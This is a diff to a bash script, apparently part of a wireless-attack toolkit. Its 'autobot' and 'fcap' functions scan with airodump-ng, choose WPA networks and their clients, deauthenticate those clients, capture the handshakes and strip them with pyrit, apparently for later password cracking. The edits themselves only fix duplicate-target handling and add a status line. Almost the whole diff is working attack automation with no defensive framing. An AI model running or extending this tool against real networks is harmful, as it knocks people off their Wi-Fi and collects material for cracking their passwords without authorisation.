@@ -13,7 +13,7 @@
 ## GNU General Public License at (http://www.gnu.org/licenses/) for
 ## more details.
 
-fautobot()																#Automagically find active clients and collects new handshakes
+fautobot()																#Automagically find active clients and collect new handshakes
 {	
 	clear
 	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
@@ -33,10 +33,14 @@ fautobot()																#Automagically find active clients and collects new ha
 			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 10 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
 			if [ ${BSSID:2:1} = ":" ] 2> /dev/null
 				then
-					if [ $(cat $HOME/Desktop/cap/handshakes/got | grep "$BSSID") -z ] 2> /dev/null
+					if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSID) -z ] 2> /dev/null
 						then
 							DONE=1
 						else
+							DONE=""
+					fi
+					if [ $ESSID -z ] 2> /dev/null
+						then
 							DONE=""
 					fi
 			fi
@@ -50,6 +54,7 @@ fautobot()																#Automagically find active clients and collects new ha
 		do
 			clear
 			$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
+			$COLOR 4;$COLOR2 1; echo " [*] TARGET $ESSID LOADED [*] ";$COLOR 9;$COLOR2 9
 			echo
 			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
 			echo
@@ -71,8 +76,6 @@ fautobot()																#Automagically find active clients and collects new ha
 	killall airodump-ng
 	clear
 	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
-	sort -u $HOME/Desktop/cap/handshakes/got > tmp
-	mv tmp $HOME/Desktop/cap/handshakes/got
 	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
 	DATE=$( date +%Y_%m_%d_%H%M%S )
 	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
@@ -239,9 +242,10 @@ fcap()																	#Deauth, capture and strip handshakes
 	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
 	killall airodump-ng
 	clear
-	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
-	sort -u $HOME/Desktop/cap/handshakes/got > tmp
-	mv tmp $HOME/Desktop/cap/handshakes/got
+	if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSID) -z ] 2>/dev/null
+		then
+			echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
+	fi
 	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
 	DATE=$( date +%Y_%m_%d_%H%M%S )
 	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
